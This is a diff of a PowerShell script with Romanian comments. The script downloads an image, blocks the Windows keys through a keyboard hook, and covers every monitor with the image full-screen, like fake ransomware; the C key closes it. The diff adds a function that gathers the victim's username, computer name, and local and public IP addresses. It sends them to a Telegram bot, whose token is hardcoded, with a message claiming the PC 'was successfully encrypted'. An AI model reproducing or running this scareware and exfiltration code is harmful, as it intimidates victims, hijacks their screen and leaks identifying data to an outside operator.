@@ -2,17 +2,40 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
+# Trimite mesaj pe Telegram
+function Send-Telegram-Message {
+    $pc = $env:COMPUTERNAME
+    $user = $env:USERNAME
+
+    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
+        Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+
+    try {
+        $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
+    } catch {
+        $ipPublic = "n/a"
+    }
+
+    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
+    $uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
+    $body = @{ chat_id = '656189986'; text = $message } | ConvertTo-Json -Compress
+
+    try {
+        Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
+    } catch {}
+}
+
 # Descărcare imagine
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
     } catch {
-        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
+        Write-Host "Eroare la descărcarea imaginii." -ForegroundColor Red
         exit
     }
 }
 
-# Blocare taste Windows și monitorizare pentru închidere
+# Blocare taste Windows și închidere la C
 function Block-And-MonitorKeys {
     Add-Type @"
         using System;
@@ -59,12 +82,12 @@ function Block-And-MonitorKeys {
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                     int vkCode = Marshal.ReadInt32(lParam);
 
-                    // Verifică dacă tasta C este apăsată
-                    if (vkCode == 0x43) { // Cod ASCII pentru tasta C
-                        Environment.Exit(0); // Închide scriptul
+                    // Tasta C = închide
+                    if (vkCode == 0x43) {
+                        Environment.Exit(0);
                     }
 
-                    // Blochează tastele Windows (stânga/dreapta)
+                    // Tasta Windows stânga/dreapta
                     if (vkCode == 0x5B || vkCode == 0x5C) {
                         return (IntPtr)1;
                     }
@@ -76,7 +99,7 @@ function Block-And-MonitorKeys {
     [KeyboardMonitor]::BlockAndMonitor()
 }
 
-# Afișare imagine pe toate monitoarele
+# Afișează imaginea pe toate monitoarele
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
@@ -99,7 +122,7 @@ function Show-FullScreenImage {
         try {
             $img = [System.Drawing.Image]::FromFile($tempImagePath)
         } catch {
-            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
+            Write-Host "Eroare la încărcarea imaginii." -ForegroundColor Red
             exit
         }
 
@@ -119,7 +142,8 @@ function Show-FullScreenImage {
     [System.Windows.Forms.Application]::Run()
 }
 
-# Execuție principală
+# EXECUȚIE
 Download-Image
+Send-Telegram-Message
 Block-And-MonitorKeys
 Show-FullScreenImage
